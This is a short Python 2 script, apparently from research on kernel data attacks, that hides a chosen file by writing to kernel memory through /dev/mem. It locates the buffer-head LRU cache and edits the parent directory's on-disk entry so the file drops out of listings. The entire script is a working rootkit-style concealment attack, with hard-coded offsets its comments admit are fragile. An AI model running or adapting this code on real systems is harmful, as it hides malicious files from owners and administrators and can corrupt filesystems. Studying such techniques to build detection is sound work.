#!/usr/bin/python

"""
FUULD testing program for testing buffer heads
Now in Python!

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

from kstructs import *
from memreader import *
from symbolfinder import *
from pidhash import *
from dentryhash import *


if len(sys.argv) != 2:
	print "Usage: ",
	print sys.argv[0],
	print " <filetohide>"
	sys.exit(-1)

# Do some work on the pathname
full_path = os.path.abspath(sys.argv[1])
basename = os.path.basename(full_path)
dirname = os.path.dirname(full_path)

if os.path.exists(dirname) == False:
	print "Parent directory does not exist!"
	sys.exit(-1)

# Declare our necessary pieces for this attack
sf = SymbolFinder()
dm = DevMemReader(sf)
bh_lrus = sf.find("per_cpu__bh_lrus")

bh = buffer_head()

# Read the item's parent dir, this causes the block related to it
# to end up at the head of the bh_lrus list.  Very convenient...
# This might not work under heavy workloads, multi-core, etc.
# (But it can be changed to handle multicore...)
print os.listdir(dirname)

# Read in the first buffer_head from the LRU
# The weird number is the offset to the array.  I don't know why.
bh_addr = dm.read_int(bh_lrus + 0x04bf2000)
dm.read(bh, bh_addr)

# Go through the directory block and find the entry, then
# remove it.
# This will probably fail for large directories with more than
# one block used to store their children...
de = dir_entry()
de_p = dir_entry()
i = bh.b_data
prev = 0
while True:
	dm.read(de, i)
	if de.inode > 0:
		print bh.b_data+i,
		print de.inode,
		print de.rec_len,
		print de.name_len,
		print de.file_type,
		fname= dm.read_bytes(i+8,de.name_len)
		print fname
		if fname == basename:
			print "found it!"
			dm.read(de_p, prev)
			de_p.rec_len += de.rec_len
			dm.write(de_p, prev)
			break;
		prev = i
		i += de.rec_len
		if i >= bh.b_data+bh.b_size:
			break
	else:
		print "Done!"
		break;
